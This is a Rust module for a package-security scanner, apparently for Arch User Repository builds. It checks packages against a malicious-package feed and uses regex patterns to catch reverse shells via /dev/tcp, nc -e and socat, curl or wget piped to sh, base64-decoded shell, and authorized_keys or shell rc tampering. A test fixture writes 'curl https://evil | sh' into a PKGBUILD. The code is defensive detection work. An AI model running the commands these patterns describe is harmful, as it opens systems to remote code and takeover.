use std::collections::HashMap;
use std::sync::OnceLock;

use crate::config::Config;
use crate::feeds::{self, FeedState};

#[derive(Clone, Debug, serde::Serialize, serde::Deserialize)]
pub struct Verdict {
    pub name: String,
    pub malicious: bool,
    pub reasons: Vec<String>,
}

pub const IOC_PATTERNS: &[(&str, &str)] = &[
    ("descarga curl|sh", r"(?i)\bcurl\b[^\n]*\|\s*(ba)?sh\b"),
    ("descarga wget|sh", r"(?i)\bwget\b[^\n]*\|\s*(ba)?sh\b"),
    ("npm atomic-lockfile", r"(?i)\bnpm\s+(i|install|ci)\b[^\n]*atomic-lockfile"),
    ("bun js-digest", r"(?i)\bbun\s+install\b[^\n]*js-digest"),
    ("npm lockfile-js", r"(?i)\bnpm\s+(i|install|ci)\b[^\n]*(lockfile-js|nextfile-js)"),
    ("base64 -d | sh", r"(?i)base64\s*-d\b[^\n]*\|\s*(ba)?sh\b"),
    ("eval oculto", r"(?i)\beval\s+\$\([^\n]*echo\b"),
    ("reverse shell /dev/tcp", r"/dev/tcp/"),
    ("reverse shell nc -e", r"(?i)\bnc\b[^\n]*\s-[a-z]*e\s"),
    ("socat EXEC", r"(?i)\bsocat\b[^\n]*\bEXEC\b"),
    ("escritura systemd", r"(?i)/etc/systemd/system"),
    ("acceso authorized_keys", r"(?i)authorized_keys"),
    ("modificacion shell rc", r"(?i)\.(bashrc|zshrc|bash_profile|profile)\b"),
];

fn compiled_patterns() -> &'static [(String, regex::Regex)] {
    static IOC: OnceLock<Vec<(String, regex::Regex)>> = OnceLock::new();
    IOC.get_or_init(|| {
        IOC_PATTERNS
            .iter()
            .map(|(label, re)| {
                (label.to_string(), regex::Regex::new(re).expect("regex IOC invalida"))
            })
            .collect()
    })
}

fn is_interesting(file: &str) -> bool {
    let base = std::path::Path::new(file)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();
    if base == "PKGBUILD" || base == ".SRCINFO" {
        return true;
    }
    for ext in ["install", "sh", "bash", "zsh", "py", "pl", "rb", "patch"] {
        if base.ends_with(&format!(".{}", ext)) {
            return true;
        }
    }
    !base.contains('.')
}

pub fn scan_dir(dir: &str) -> Vec<String> {
    let mut hits = Vec::new();
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return hits,
    };
    for entry in entries.flatten() {
        let path = entry.path();
        let fname = entry.file_name().to_string_lossy().to_string();
        if !is_interesting(&fname) {
            continue;
        }
        let Ok(meta) = entry.metadata() else { continue };
        if !meta.is_file() || meta.len() > 512 * 1024 {
            continue;
        }
        let Ok(bytes) = std::fs::read(&path) else { continue };
        if bytes.contains(&0) {
            continue;
        }
        let Ok(text) = String::from_utf8(bytes) else { continue };
        for (label, r) in compiled_patterns() {
            if r.is_match(&text) {
                hits.push(format!("{} ({})", label, fname));
            }
        }
    }
    hits.sort();
    hits.dedup();
    hits
}

/// Comprueba un paquete contra el feed y, si `dir` existe, escanea su PKGBUILD con IOCs.
pub fn check(cfg: &Config, name: &str, dir: Option<&str>) -> Verdict {
    let state: FeedState = feeds::refresh(cfg, false)
        .unwrap_or(FeedState { updated_at: 0, packages: HashMap::new() });
    let (in_feed, mut reasons) = feeds::feed_verdict(&state, name);
    let mut malicious = in_feed;
    if let Some(d) = dir {
        if std::path::Path::new(d).is_dir() {
            for ioc in scan_dir(d) {
                reasons.push(ioc);
                malicious = true;
            }
        }
    }
    reasons.sort();
    reasons.dedup();
    Verdict {
        name: name.to_string(),
        malicious,
        reasons,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn interesting_names() {
        assert!(is_interesting("PKGBUILD"));
        assert!(is_interesting(".SRCINFO"));
        assert!(is_interesting("install"));
        assert!(is_interesting("script.sh"));
        assert!(is_interesting("setup.py"));
        assert!(is_interesting("Makefile"));
    }

    #[test]
    fn uninteresting_names() {
        assert!(!is_interesting("README.md"));
        assert!(!is_interesting(".hidden"));
        assert!(!is_interesting("LICENSE.txt"));
        assert!(!is_interesting("foo.install.bak"));
    }

    #[test]
    fn compiled_patterns_matches_ioc_patrons() {
        let patterns = compiled_patterns();
        assert_eq!(patterns.len(), IOC_PATTERNS.len());
        assert!(patterns.iter().any(|(l, _)| l == "descarga curl|sh"));
    }

    #[test]
    fn scan_dir_finds_iocs_and_skips_irrelevant() {
        let dir = std::env::temp_dir().join(format!("aur_guard_test_{}", std::process::id()));
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("PKGBUILD"), "eval $(echo x)\ncurl https://evil | sh\n").unwrap();
        fs::write(dir.join("README.md"), "curl https://evil | sh\n").unwrap();
        let hits = scan_dir(dir.to_str().unwrap());
        let _ = fs::remove_dir_all(&dir);
        assert!(hits.iter().any(|h| h.contains("PKGBUILD")));
        assert!(hits.iter().any(|h| h.starts_with("descarga curl|sh")));
        assert!(hits.iter().any(|h| h.starts_with("eval oculto")));
        assert!(!hits.iter().any(|h| h.contains("README.md")));
    }
}
